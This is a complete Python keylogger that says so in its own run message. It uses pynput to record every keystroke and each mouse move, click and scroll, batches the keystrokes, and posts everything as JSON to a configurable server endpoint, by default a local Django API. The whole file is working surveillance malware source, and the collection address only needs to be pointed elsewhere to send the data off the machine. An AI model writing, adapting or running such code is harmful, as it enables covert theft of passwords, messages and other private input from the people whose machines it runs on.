import warnings
import requests
import json
import threading
from pynput import keyboard, mouse

# Suppress RequestsDependencyWarning globally
from requests.packages.urllib3.exceptions import DependencyWarning
warnings.filterwarnings("ignore", category=DependencyWarning)

# Configurable server IP and port
IP_ADDRESS = '127.0.0.1'
PORT_NUMBER = '8000'

KEYSTROKE_URL = f'http://{IP_ADDRESS}:{PORT_NUMBER}/api/log-keystroke/'
MOUSE_URL = f'http://{IP_ADDRESS}:{PORT_NUMBER}/api/log-mouse-action/'

log_buffer = []
buffer_lock = threading.Lock()
batch_timer = None  # To avoid multiple overlapping timers

def on_press(key):
    """Handle keyboard key press events."""
    try:
        log = {'key': key.char}
    except AttributeError:
        key_mapping = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t'
        }
        log = {'key': key_mapping.get(key, str(key))}

    with buffer_lock:
        log_buffer.append(log)
    schedule_batch_sending()

def on_move(x, y):
    """Handle mouse movement events."""
    log = {'action': 'move', 'coordinates': f"({x}, {y})"}
    send_to_backend(MOUSE_URL, log)

def on_click(x, y, button, pressed):
    """Handle mouse click events."""
    action = 'pressed' if pressed else 'released'
    log = {'action': action, 'button': str(button), 'coordinates': f"({x}, {y})"}
    send_to_backend(MOUSE_URL, log)

def on_scroll(x, y, dx, dy):
    """Handle mouse scroll events."""
    log = {'action': 'scroll', 'coordinates': f"({x}, {y})", 'delta': f"({dx}, {dy})"}
    send_to_backend(MOUSE_URL, log)

def schedule_batch_sending():
    """Schedule batch sending to prevent overlapping timers."""
    global batch_timer
    if batch_timer and batch_timer.is_alive():
        return
    batch_timer = threading.Timer(10, send_data_in_batches)
    batch_timer.start()

def send_data_in_batches():
    """Send collected keystroke data in batches."""
    global log_buffer
    with buffer_lock:
        if log_buffer:
            payload = {'data': log_buffer}
            send_to_backend(KEYSTROKE_URL, payload)
            log_buffer = []

def send_to_backend(url, log):
    """Send logged data to the Django backend."""
    try:
        response = requests.post(url, headers={'Content-Type': 'application/json'}, json=log)
        if response.status_code in [200, 201]:
            print(f"Data successfully sent to {url}")
        else:
            print(f"Failed to send data: {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")

def start_listeners():
    """Start both keyboard and mouse listeners."""
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

    keyboard_listener.start()
    mouse_listener.start()

    # Keep the listeners running
    keyboard_listener.join()
    mouse_listener.join()

if __name__ == "__main__":
    print("Keylogger is running. Press Ctrl+C to stop.")
    try:
        start_listeners()
    except KeyboardInterrupt:
        print("Keylogger stopped by user.")

